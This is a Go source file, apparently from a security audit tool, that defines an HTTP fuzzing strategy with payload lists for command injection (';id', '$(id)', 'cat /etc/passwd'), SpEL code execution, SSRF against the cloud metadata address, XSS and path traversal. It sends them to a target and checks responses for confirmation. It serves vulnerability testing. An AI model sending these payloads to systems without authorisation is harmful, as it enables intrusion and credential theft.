package fuzzer

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/joern-audit/joern_audit/internal/config"
)

// HTTPGenericStrategy handles multiple CWE types using custom HTTP payloads:
// CWE-78 (OS Command Injection), CWE-94 (Code Injection / SSTI),
// CWE-918 (SSRF), CWE-79 (XSS), CWE-22 (Path Traversal).
type HTTPGenericStrategy struct {
	cfg      *config.FuzzerConfig
	payloads map[string][]payloadDef
}

type payloadDef struct {
	Payload    string
	Indicators []string // strings to look for in response
}

func NewHTTPGenericStrategy(cfg *config.FuzzerConfig) *HTTPGenericStrategy {
	s := &HTTPGenericStrategy{
		cfg:      cfg,
		payloads: make(map[string][]payloadDef),
	}

	// CWE-78: OS Command Injection
	// Note: Java Runtime.exec(cmd) does NOT use a shell, so shell metacharacters
	// like ;, $(), `` won't work. Use direct commands first, then shell-wrapped ones.
	s.payloads["CWE-78"] = []payloadDef{
		{Payload: "id", Indicators: []string{"uid="}},
		{Payload: "whoami", Indicators: []string{"root", "www-data", "tomcat", "java", "admin"}},
		{Payload: "cat /etc/passwd", Indicators: []string{"root:", "/bin/"}},
		{Payload: "/bin/sh -c id", Indicators: []string{"uid="}},
		{Payload: ";id", Indicators: []string{"uid="}},
		{Payload: "$(id)", Indicators: []string{"uid="}},
		{Payload: "|id", Indicators: []string{"uid="}},
	}

	// CWE-94: Code Injection / SSTI / Expression Language
	// Include universal expression payloads (work in most expression engines)
	// and technology-specific payloads (QLExpress, SpEL, Freemarker, etc.)
	s.payloads["CWE-94"] = []payloadDef{
		{Payload: "3*7", Indicators: []string{"21"}},
		{Payload: "1+1", Indicators: []string{"2"}},
		{Payload: "${7*7}", Indicators: []string{"49"}},
		{Payload: "{{7*7}}", Indicators: []string{"49"}},
		{Payload: "#{7*7}", Indicators: []string{"49"}},
		{Payload: "<%= 7*7 %>", Indicators: []string{"49"}},
		{Payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", Indicators: []string{"uid=", "Process"}},
	}

	// CWE-918: SSRF
	s.payloads["CWE-918"] = []payloadDef{
		{Payload: "http://127.0.0.1:22", Indicators: []string{"SSH", "OpenSSH", "ssh"}},
		{Payload: "http://127.0.0.1:80", Indicators: []string{"<html", "<HTML", "HTTP"}},
		{Payload: "http://169.254.169.254/latest/meta-data/", Indicators: []string{"ami-id", "instance-id", "meta-data"}},
		{Payload: "http://[::1]:80/", Indicators: []string{"<html", "<HTML"}},
	}

	// CWE-79: XSS (reflected)
	s.payloads["CWE-79"] = []payloadDef{
		{Payload: `<script>alert(1)</script>`, Indicators: []string{`<script>alert(1)</script>`}},
		{Payload: `"><img src=x onerror=alert(1)>`, Indicators: []string{`onerror=alert(1)`}},
		{Payload: `'><svg/onload=alert(1)>`, Indicators: []string{`onload=alert(1)`}},
	}

	// CWE-22: Path Traversal
	s.payloads["CWE-22"] = []payloadDef{
		{Payload: "../../../etc/passwd", Indicators: []string{"root:", "/bin/"}},
		{Payload: "....//....//....//etc/passwd", Indicators: []string{"root:", "/bin/"}},
		{Payload: "..%2f..%2f..%2fetc%2fpasswd", Indicators: []string{"root:", "/bin/"}},
		{Payload: "/etc/passwd", Indicators: []string{"root:", "/bin/"}},
	}

	return s
}

func (s *HTTPGenericStrategy) Name() string { return "http_generic" }

func (s *HTTPGenericStrategy) CanHandle(cwe string) bool {
	_, ok := s.payloads[cwe]
	return ok
}

func (s *HTTPGenericStrategy) GeneratePoC(ctx context.Context, req PoCRequest) (*PoCTemplate, error) {
	payloads, ok := s.payloads[req.CWE]
	if !ok || len(payloads) == 0 {
		return nil, fmt.Errorf("no payloads defined for %s", req.CWE)
	}

	parsed := ParseAttackVector(req.AttackVector)
	RefineWithRegistry(parsed, req.Evidence, req.Registry, req.SourceRoot)
	targetURL := BuildTargetURL(req.TargetURL, parsed)

	// Store all payloads in the template for iterative execution
	// Use the first payload as the primary one in the template
	return &PoCTemplate{
		Type:    "http_generic",
		Method:  parsed.Method,
		URL:     targetURL,
		Headers: parsed.Headers,
		Body:    parsed.Body,
		Payload: fmt.Sprintf("CWE=%s param=%s payloads=%d", req.CWE, parsed.ParamName, len(payloads)),
	}, nil
}

func (s *HTTPGenericStrategy) Execute(ctx context.Context, poc *PoCTemplate) (*FuzzResult, error) {
	// Extract CWE from payload description
	cwe := ""
	if strings.HasPrefix(poc.Payload, "CWE=") {
		parts := strings.Fields(poc.Payload)
		if len(parts) > 0 {
			cwe = strings.TrimPrefix(parts[0], "CWE=")
		}
	}

	payloads, ok := s.payloads[cwe]
	if !ok {
		return &FuzzResult{
			Status: FuzzError,
			Tool:   "http_generic",
			Error:  fmt.Sprintf("no payloads for CWE %s", cwe),
		}, nil
	}

	// Extract param name from payload description
	paramName := ""
	for _, part := range strings.Fields(poc.Payload) {
		if strings.HasPrefix(part, "param=") {
			paramName = strings.TrimPrefix(part, "param=")
			break
		}
	}

	timeout := s.cfg.Timeout
	if timeout <= 0 {
		timeout = 120
	}
	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}

	// Try each payload until one confirms
	for _, pd := range payloads {
		result := s.tryPayload(ctx, client, poc, paramName, pd)
		if result.Status == FuzzConfirmed {
			return result, nil
		}
	}

	return &FuzzResult{
		Status:       FuzzFailed,
		Tool:         "http_generic",
		PoC:          fmt.Sprintf("%s payloads for %s", cwe, poc.URL),
		ResponseDiff: fmt.Sprintf("None of %d payloads triggered for %s", len(payloads), cwe),
	}, nil
}

// tryPayload sends a single payload and checks for indicators in the response.
func (s *HTTPGenericStrategy) tryPayload(ctx context.Context, client *http.Client, poc *PoCTemplate, paramName string, pd payloadDef) *FuzzResult {
	result := &FuzzResult{
		Tool: "http_generic",
		PoC:  fmt.Sprintf("param=%s payload=%s", paramName, pd.Payload),
	}

	// Build the request with the payload injected
	targetURL := poc.URL
	method := poc.Method
	if method == "" {
		method = "GET"
	}

	var body string

	if paramName != "" && method == "GET" {
		// Inject into query parameter
		u, err := url.Parse(targetURL)
		if err != nil {
			result.Status = FuzzError
			result.Error = fmt.Sprintf("invalid URL: %v", err)
			return result
		}
		q := u.Query()
		q.Set(paramName, pd.Payload)
		u.RawQuery = q.Encode()
		targetURL = u.String()
	} else if paramName != "" && (method == "POST" || method == "PUT") {
		// Inject into POST body
		if poc.Body != "" {
			body = strings.Replace(poc.Body, paramName+"=", paramName+"="+url.QueryEscape(pd.Payload), 1)
		} else {
			body = paramName + "=" + url.QueryEscape(pd.Payload)
		}
	} else {
		// No param name: append payload to URL path
		targetURL = strings.TrimRight(targetURL, "/") + "/" + url.PathEscape(pd.Payload)
	}

	var reqBody io.Reader
	if body != "" {
		reqBody = strings.NewReader(body)
	}

	req, err := http.NewRequestWithContext(ctx, method, targetURL, reqBody)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("create request: %v", err)
		return result
	}

	for k, v := range poc.Headers {
		req.Header.Set(k, v)
	}
	if body != "" && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	resp, err := client.Do(req)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
		return result
	}
	defer resp.Body.Close()

	respBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	respBody := string(respBytes)

	// Skip confirmation on 404/405 responses — endpoint doesn't exist, can't be vulnerable
	if resp.StatusCode == 404 || resp.StatusCode == 405 {
		result.Status = FuzzFailed
		result.ResponseDiff = fmt.Sprintf("Endpoint not found (status %d)", resp.StatusCode)
		return result
	}

	// Check for indicators
	for _, indicator := range pd.Indicators {
		if strings.Contains(respBody, indicator) {
			result.Status = FuzzConfirmed
			result.ResponseDiff = fmt.Sprintf("Indicator %q found in response (status %d)", indicator, resp.StatusCode)
			return result
		}
	}

	result.Status = FuzzFailed
	result.ResponseDiff = fmt.Sprintf("No indicators matched (status %d)", resp.StatusCode)
	return result
}
